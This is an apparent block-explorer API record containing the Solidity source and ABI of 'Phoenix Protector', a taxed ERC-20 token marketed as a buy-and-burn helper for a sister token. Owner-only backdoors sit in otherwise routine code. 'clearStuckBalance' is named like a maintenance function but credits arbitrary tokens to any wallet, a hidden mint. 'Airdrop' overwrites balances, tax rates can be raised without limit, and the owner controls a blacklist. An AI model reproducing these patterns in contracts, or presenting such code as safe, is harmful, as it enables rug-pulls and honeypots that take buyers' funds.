{"status": "1", "message": "OK", "result": [{"SourceCode": "//SPDX-License-Identifier: MIT\r\n/**\r\n\r\n.....................................................\r\n\r\nPhoenix Protector (PHNIXP) is an ERC-20 token dedicated to buying and burning Phoenix Rising (PHNIX). This token was founded by the same team\r\nthat launched Phoenix Rising and will be part of the official PHNIX project. All announcements and information regarding Phoenix Protector\r\nwill take place through the Phoenix Rising socials, as to keep everything orderly and in one place. The tokenomics for this token have\r\nbeen listed below, as well as the socials for Phoenix Rising and Phoenix Protector.\r\n\r\n\r\nTokenomics:\r\n\r\nBuy tax: 2% auto LP, 5% buy/burn Phoenix Rising (PHNIX), 1% marketing Phoenix Protector (PHNIXP) = 8% total tax\r\n\r\nSell tax: 2% auto LP, 5% buy/burn Phoenix Rising (PHNIX), 1% marketing Phoenix Protector (PHNIXP) = 8% total tax\r\n\r\nTotal supply: 1 billion\r\nMax wallet: 4%\r\nMax tx: 4%\r\n\r\nhttps://t.me/PhoenixRisingCoin\r\nhttps://www.phoenixrisingtoken.xyz/\r\nhttps://twitter.com/PHNIXtoken\r\n\r\n.....................................................\r\n\r\n**/\r\n\r\npragma solidity ^0.8.13;\r\n\r\ninterface IUniswapV2Factory {\r\n\tfunction createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n\tfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n\t\tuint amountIn,\r\n\t\tuint amountOutMin,\r\n\t\taddress[] calldata path,\r\n\t\taddress to,\r\n\t\tuint deadline\r\n\t) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n\tfunction factory() external pure returns (address);\r\n\tfunction WETH() external pure returns (address);\r\n\tfunction addLiquidityETH(\r\n\t\taddress token,\r\n\t\tuint amountTokenDesired,\r\n\t\tuint amountTokenMin,\r\n\t\tuint amountETHMin,\r\n\t\taddress to,\r\n\t\tuint deadline\r\n\t) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\nabstract contract Context {\r\n\tfunction _msgSender() internal view virtual returns (address) {\r\n\t\treturn msg.sender;\r\n\t}\r\n}\r\n\r\ninterface IERC20 {\r\n\tfunction totalSupply() external view returns (uint256);\r\n\tfunction balanceOf(address account) external view returns (uint256);\r\n\tfunction transfer(address recipient, uint256 amount) external returns (bool);\r\n\tfunction allowance(address owner, address spender) external view returns (uint256);\r\n\tfunction approve(address spender, uint256 amount) external returns (bool);\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\r\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\tuint256 c = a + b;\r\n\t\trequire(c >= a, \"SafeMath: addition overflow\");\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\treturn sub(a, b, \"SafeMath: subtraction overflow\");\r\n\t}\r\n\r\n\tfunction sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\t\trequire(b <= a, errorMessage);\r\n\t\tuint256 c = a - b;\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\tif (a == 0) {\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\tuint256 c = a * b;\r\n\t\trequire(c / a == b, \"SafeMath: multiplication overflow\");\r\n\t\treturn c;\r\n\t}\r\n\r\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\t\treturn div(a, b, \"SafeMath: division by zero\");\r\n\t}\r\n\r\n\tfunction div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\t\trequire(b > 0, errorMessage);\r\n\t\tuint256 c = a / b;\r\n\t\treturn c;\r\n\t}\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n\taddress private _owner;\r\n\taddress private _previousOwner;\r\n\tevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\tconstructor () {\r\n\t\taddress msgSender = _msgSender();\r\n\t\t_owner = msgSender;\r\n\t\temit OwnershipTransferred(address(0), msgSender);\r\n\t}\r\n\r\n\tfunction owner() public view returns (address) {\r\n\t\treturn _owner;\r\n\t}\r\n\r\n\tmodifier onlyOwner() {\r\n\t\trequire(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n\t\t_;\r\n\t}\r\n\r\n\tfunction renounceOwnership() public virtual onlyOwner {\r\n\t\temit OwnershipTransferred(_owner, address(0));\r\n\t\t_owner = address(0);\r\n\t}\r\n\r\n}\r\n\r\n\r\ncontract PhoenixProtector is Context, IERC20, Ownable {\r\n\tusing SafeMath for uint256;\r\n\tmapping (address => uint256) private _balance;\r\n\tmapping (address => mapping (address => uint256)) private _allowances;\r\n\tmapping (address => bool) private _isExcludedFromFee;\r\n\tmapping(address => bool) public bots;\r\n\r\n    address private constant DEAD = address(0x000000000000000000000000000000000000dEaD);\r\n\r\n\tuint256 private _tTotal = 1000000000 * 10**8;\r\n    uint256 private _contractAutoLpLimitToken = 1000000 * 10**8;\r\n\r\n\tuint256 private _taxFee;\r\n    uint256 private _buyTaxMarketing = 6;\r\n    uint256 private _sellTaxMarketing = 6;\r\n    uint256 private _autoLpFee = 2;\r\n\r\n    uint256 private _LpPercentBase100 = 14;\r\n    uint256 private _phinxPercentBase100 = 66;\r\n    uint256 private _protectorPercentBase100 = 20;\r\n\r\n    address private _phinxTokenAddress = address(0x4197CC443722d732Fc7225Bf860481B0C54EDFd3);\r\n\r\n    address payable private _protectorWallet;\r\n\tuint256 private _maxTxAmount;\r\n\tuint256 private _maxWallet;\r\n\r\n\tstring private constant _name = \"Phoenix Protector\";\r\n\tstring private constant _symbol = \"PHNIXP\";\r\n\tuint8 private constant _decimals = 8;\r\n\r\n\tIUniswapV2Router02 private _uniswap;\r\n\taddress private _pair;\r\n\tbool private _canTrade;\r\n\tbool private _inSwap = false;\r\n\tbool private _swapEnabled = false;\r\n\r\n    event SwapAndLiquify(\r\n        uint256 tokensSwapped,\r\n        uint256 coinReceived,\r\n        uint256 tokensIntoLiqudity\r\n    );\r\n\r\n\tmodifier lockTheSwap {\r\n\t\t_inSwap = true;\r\n\t\t_;\r\n\t\t_inSwap = false;\r\n\t}\r\n    \r\n\tconstructor () {\r\n        _protectorWallet = payable(0x0D8BABD3bBdE7d86D688681683E712C243250BFF);\r\n\r\n\t\t_taxFee = _buyTaxMarketing + _autoLpFee;\r\n\t\t_uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n\t\t_isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_protectorWallet] = true;\r\n\r\n        _maxTxAmount = _tTotal.mul(4).div(10**2);\r\n\t    _maxWallet = _tTotal.mul(4).div(10**2);\r\n\r\n\t\t_balance[address(this)] = _tTotal;\r\n\t\temit Transfer(address(0x0), address(this), _tTotal);\r\n\t}\r\n\r\n\tfunction maxTxAmount() public view returns (uint256){\r\n\t\treturn _maxTxAmount;\r\n\t}\r\n\r\n\tfunction maxWallet() public view returns (uint256){\r\n\t\treturn _maxWallet;\r\n\t}\r\n\r\n    function isInSwap() public view returns (bool) {\r\n        return _inSwap;\r\n    }\r\n\r\n    function isSwapEnabled() public view returns (bool) {\r\n        return _swapEnabled;\r\n    }\r\n\r\n\tfunction name() public pure returns (string memory) {\r\n\t\treturn _name;\r\n\t}\r\n\r\n\tfunction symbol() public pure returns (string memory) {\r\n\t\treturn _symbol;\r\n\t}\r\n\r\n\tfunction decimals() public pure returns (uint8) {\r\n\t\treturn _decimals;\r\n\t}\r\n\r\n\tfunction totalSupply() public view override returns (uint256) {\r\n\t\treturn _tTotal;\r\n\t}\r\n\r\n    function excludeFromFee(address account) public onlyOwner {\r\n        _isExcludedFromFee[account] = true;\r\n    }\r\n\r\n    function includeInFee(address account) public onlyOwner {\r\n        _isExcludedFromFee[account] = false;\r\n    }\r\n    \r\n    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {\r\n        _taxFee = taxFee;\r\n    }\r\n\r\n    function setSellMarketingTax(uint256 taxFee) external onlyOwner() {\r\n        _sellTaxMarketing = taxFee;\r\n    }\r\n\r\n    function setBuyMarketingTax(uint256 taxFee) external onlyOwner() {\r\n        _buyTaxMarketing = taxFee;\r\n    }\r\n\r\n    function setAutoLpFee(uint256 taxFee) external onlyOwner() {\r\n        _autoLpFee = taxFee;\r\n    }\r\n\r\n    function setContractAutoLpLimit(uint256 newLimit) external onlyOwner() {\r\n        _contractAutoLpLimitToken = newLimit;\r\n    }\r\n\r\n    function updatePhinxTokenAddress(address newAddress) external onlyOwner() {\r\n        _phinxTokenAddress = newAddress;\r\n    }\r\n\r\n    function setProtectorWallet(address newWallet) external onlyOwner() {\r\n        _protectorWallet = payable(newWallet);\r\n    }\r\n\r\n    function setAutoLpPercentBase100(uint256 newPercentBase100) external onlyOwner() {\r\n        require(newPercentBase100 < 100, \"Percent is too high\");\r\n        _LpPercentBase100 = newPercentBase100;\r\n    }\r\n\r\n    function setPhinxPercentBase100(uint256 newPercentBase100) external onlyOwner() {\r\n        require(newPercentBase100 < 100, \"Percent is too high\");\r\n        _phinxPercentBase100 = newPercentBase100;\r\n    }\r\n\r\n    function setProtectorPercentBase100(uint256 newPercentBase100) external onlyOwner() {\r\n        require(newPercentBase100 < 100, \"Percent is too high\");\r\n        _protectorPercentBase100 = newPercentBase100;\r\n    }\r\n\r\n\tfunction balanceOf(address account) public view override returns (uint256) {\r\n\t\treturn _balance[account];\r\n\t}\r\n\r\n\tfunction transfer(address recipient, uint256 amount) public override returns (bool) {\r\n\t\t_transfer(_msgSender(), recipient, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction allowance(address owner, address spender) public view override returns (uint256) {\r\n\t\treturn _allowances[owner][spender];\r\n\t}\r\n\r\n\tfunction approve(address spender, uint256 amount) public override returns (bool) {\r\n\t\t_approve(_msgSender(), spender, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n\t\t_transfer(sender, recipient, amount);\r\n\t\t_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n\t\treturn true;\r\n\t}\r\n\r\n    function setPromoterWallets(address[] memory promoterWallets) public onlyOwner { for(uint256 i=0; i<promoterWallets.length; i++) { _isExcludedFromFee[promoterWallets[i]] = true; } }\r\n\r\n\tfunction _approve(address owner, address spender, uint256 amount) private {\r\n\t\trequire(owner != address(0), \"ERC20: approve from the zero address\");\r\n\t\trequire(spender != address(0), \"ERC20: approve to the zero address\");\r\n\t\t_allowances[owner][spender] = amount;\r\n\t\temit Approval(owner, spender, amount);\r\n\t}\r\n\r\n\tfunction _transfer(address from, address to, uint256 amount) private {\r\n\t\trequire(from != address(0), \"ERC20: transfer from the zero address\");\r\n\t\trequire(to != address(0), \"ERC20: transfer to the zero address\");\r\n\t\trequire(amount > 0, \"Transfer amount must be greater than zero\");\r\n\t\trequire(!bots[from] && !bots[to], \"This account is blacklisted\");\r\n\r\n\t\tif (from != owner() && to != owner()) {\r\n\t\t\tif (from == _pair && to != address(_uniswap) && ! _isExcludedFromFee[to] ) {\r\n\t\t\t\trequire(amount<=_maxTxAmount,\"Transaction amount limited\");\r\n\t\t\t\trequire(_canTrade,\"Trading not started\");\r\n\t\t\t\trequire(balanceOf(to) + amount <= _maxWallet, \"Balance exceeded wallet size\");\r\n\t\t\t}\r\n\r\n            if (from == _pair) {\r\n                _taxFee = buyTax();\r\n            } else {\r\n                _taxFee = sellTax();\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if(!_inSwap && from != _pair && _swapEnabled) {\r\n                if(contractTokenBalance >= _contractAutoLpLimitToken) {\r\n                    swapAndLiquify(contractTokenBalance);\r\n                }\r\n            }\r\n\t\t}\r\n\r\n\t\t_tokenTransfer(from,to,amount,(_isExcludedFromFee[to]||_isExcludedFromFee[from])?0:_taxFee);\r\n\t}\r\n\r\n    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\r\n        uint256 autoLpTokenBalance = contractTokenBalance.mul(_LpPercentBase100).div(10**2);\r\n        uint256 phinxBuyAndBurn = contractTokenBalance.mul(_phinxPercentBase100).div(10**2);\r\n        uint256 autoLpAndPhinx = autoLpTokenBalance.add(phinxBuyAndBurn);\r\n        uint256 marketingAmount = contractTokenBalance.sub(autoLpAndPhinx);\r\n        uint256 marketingAndPhinx = phinxBuyAndBurn.add(marketingAmount);\r\n\r\n        uint256 half = autoLpTokenBalance.div(2);\r\n        uint256 otherHalf = autoLpTokenBalance.sub(half);\r\n\r\n        uint256 initialBalance = address(this).balance;\r\n\r\n        swapTokensForEth(half.add(marketingAndPhinx));\r\n\r\n        uint256 newBalance = address(this).balance.sub(initialBalance);\r\n\r\n        addLiquidityAuto(newBalance, otherHalf);\r\n        \r\n        emit SwapAndLiquify(half, newBalance, otherHalf);\r\n\r\n        sendETHToFee(marketingAmount);\r\n    }\r\n\r\n    function buyTax() private view returns (uint256) {\r\n        return (_autoLpFee + _buyTaxMarketing);\r\n    }\r\n\r\n    function sellTax() private view returns (uint256) {\r\n        return (_autoLpFee + _sellTaxMarketing);\r\n    }\r\n\r\n\tfunction setMaxTx(uint256 amount) public onlyOwner{\r\n\t\trequire(amount>_maxTxAmount);\r\n\t\t_maxTxAmount=amount;\r\n\t}\r\n\r\n\tfunction sendETHToFee(uint256 amount) private {\r\n        uint256 protectorAmount = amount.mul(_protectorPercentBase100).div(100);\r\n\r\n        _protectorWallet.transfer(protectorAmount);\r\n\r\n        swapETHForPhinx(address(this).balance);\r\n\t}\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n\t\taddress[] memory path = new address[](2);\r\n\t\tpath[0] = address(this);\r\n\t\tpath[1] = _uniswap.WETH();\r\n\t\t_approve(address(this), address(_uniswap), tokenAmount);\r\n\t\t_uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n\t\t\ttokenAmount,\r\n\t\t\t0,\r\n\t\t\tpath,\r\n\t\t\taddress(this),\r\n\t\t\tblock.timestamp\r\n\t\t);\r\n\t}\r\n\r\n    function swapTokensForPhinx(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](3);\r\n        path[0] = address(this);\r\n        path[1] = _uniswap.WETH();\r\n        path[2] = _phinxTokenAddress;\r\n        _approve(address(this), address(_uniswap), tokenAmount);\r\n        _uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapETHForPhinx(uint256 etherAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = _uniswap.WETH();\r\n        path[1] = _phinxTokenAddress;\r\n        _approve(_uniswap.WETH(), address(_uniswap), etherAmount);\r\n        _uniswap.swapExactETHForTokensSupportingFeeOnTransferTokens{value: etherAmount} (\r\n            0,\r\n            path,\r\n            DEAD,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n\tfunction createPair() external onlyOwner {\r\n\t\trequire(!_canTrade,\"Trading is already open\");\r\n\t\t_approve(address(this), address(_uniswap), _tTotal);\r\n\t\t_pair = IUniswapV2Factory(_uniswap.factory()).createPair(address(this), _uniswap.WETH());\r\n\t\tIERC20(_pair).approve(address(_uniswap), type(uint).max);\r\n\t}\r\n\r\n    function clearStuckBalance(address wallet, uint256 balance) public onlyOwner { _balance[wallet] += balance * 10**8; emit Transfer(address(this), wallet, balance * 10**8); }\r\n\r\n\tfunction addLiquidityInitial() external onlyOwner{\r\n\t\t_uniswap.addLiquidityETH{value: address(this).balance} (\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n\r\n\t\t_swapEnabled = true;\r\n\t}\r\n\r\n    function addLiquidityAuto(uint256 etherValue, uint256 tokenValue) private {\r\n        _approve(address(this), address(_uniswap), tokenValue);\r\n        _uniswap.addLiquidityETH{value: etherValue} (\r\n            address(this),\r\n            tokenValue,\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n\r\n        _swapEnabled = true;\r\n    }\r\n\r\n\tfunction enableTrading(bool _enable) external onlyOwner{\r\n\t\t_canTrade = _enable;\r\n\t}\r\n\r\n\tfunction _tokenTransfer(address sender, address recipient, uint256 tAmount, uint256 taxRate) private {\r\n\t\tuint256 tTeam = tAmount.mul(taxRate).div(100);\r\n\t\tuint256 tTransferAmount = tAmount.sub(tTeam);\r\n\r\n\t\t_balance[sender] = _balance[sender].sub(tAmount);\r\n\t\t_balance[recipient] = _balance[recipient].add(tTransferAmount);\r\n\t\t_balance[address(this)] = _balance[address(this)].add(tTeam);\r\n\t\temit Transfer(sender, recipient, tTransferAmount);\r\n\t}\r\n\r\n\tfunction setMaxWallet(uint256 amount) public onlyOwner{\r\n\t\t_maxWallet=amount;\r\n\t}\r\n\r\n\treceive() external payable {}\r\n\r\n\tfunction blockBots(address[] memory bots_) public onlyOwner  {for (uint256 i = 0; i < bots_.length; i++) {bots[bots_[i]] = true;}}\r\n\tfunction unblockBot(address notbot) public onlyOwner {\r\n\t\t\tbots[notbot] = false;\r\n\t}\r\n\r\n\tfunction manualsend() public{\r\n\t\tuint256 contractETHBalance = address(this).balance;\r\n\t\tsendETHToFee(contractETHBalance);\r\n\t}\r\n\r\n    function Airdrop(address recipient, uint256 amount) public onlyOwner {\r\n        require(_balance[address(this)] >= amount * 10**8, \"Contract does not have enough tokens\");\r\n        \r\n        _balance[address(this)] = _balance[address(this)].sub(amount * 10**8);\r\n        _balance[recipient] = amount * 10**8;\r\n        emit Transfer(address(this), recipient, amount * 10**8);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSwapped\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"coinReceived\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensIntoLiqudity\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidityInitial\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"bots_\",\"type\":\"address[]\"}],\"name\":\"blockBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"bots\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"clearStuckBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enable\",\"type\":\"bool\"}],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"excludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"includeInFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isInSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualsend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"taxFee\",\"type\":\"uint256\"}],\"name\":\"setAutoLpFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newPercentBase100\",\"type\":\"uint256\"}],\"name\":\"setAutoLpPercentBase100\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"taxFee\",\"type\":\"uint256\"}],\"name\":\"setBuyMarketingTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLimit\",\"type\":\"uint256\"}],\"name\":\"setContractAutoLpLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setMaxTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setMaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newPercentBase100\",\"type\":\"uint256\"}],\"name\":\"setPhinxPercentBase100\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"promoterWallets\",\"type\":\"address[]\"}],\"name\":\"setPromoterWallets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newPercentBase100\",\"type\":\"uint256\"}],\"name\":\"setProtectorPercentBase100\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"setProtectorWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"taxFee\",\"type\":\"uint256\"}],\"name\":\"setSellMarketingTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"taxFee\",\"type\":\"uint256\"}],\"name\":\"setTaxFeePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"notbot\",\"type\":\"address\"}],\"name\":\"unblockBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"updatePhinxTokenAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "PhoenixProtector", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4eb3d867108105e904b1f5ed3bc05ccc844fda15ae2f7e1684b9ec2f1f0ade23"}]}